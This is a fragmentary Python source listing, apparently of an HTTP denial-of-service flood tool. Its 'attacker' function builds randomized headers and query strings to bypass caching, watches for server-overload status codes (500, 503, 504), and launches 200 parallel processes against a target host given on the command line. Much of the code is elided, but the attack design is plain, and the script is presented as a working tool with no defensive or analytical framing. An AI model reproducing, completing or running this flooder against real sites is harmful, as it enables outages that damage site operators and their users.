...
def attacker(num):
    ...
    HeaderDict = {
        ...
        + buildblock(random.randint(random.randint(0, 5), random.randint(6, 10))),
        "Keep-Alive": str(random.randint(110, 120)),
        "Connection": "keep-alive",
        "Host": param_class.host,
    }
    urlreq = (
        urlc
        + param_joiner
        + buildblock(random.randint(random.randint(0, 3), random.randint(4, 10)))
        + "="
        + buildblock(random.randint(random.randint(0, 3), random.randint(4, 10)))
    )
    try:
        ...
        if (
            (str(r.status_code) == "500")
            or (str(r.status_code) == "503")
            or (str(r.status_code) == "504")
        ):
            ...
            ("30" in str(r.status_code))
            or ("40" in str(r.status_code))
            or ("50" in str(r.status_code))
        ):  # For other unexpected HTTPS errors, prints the error code.
...
if __name__ == "__main__":
    ...
    if len(sys.argv) < 2:
        ...
        if sys.argv[1] == "help":
            ...
            p = Pool(
                processes=200, initializer=init, initargs=(counter, status, flag, fault)
            )
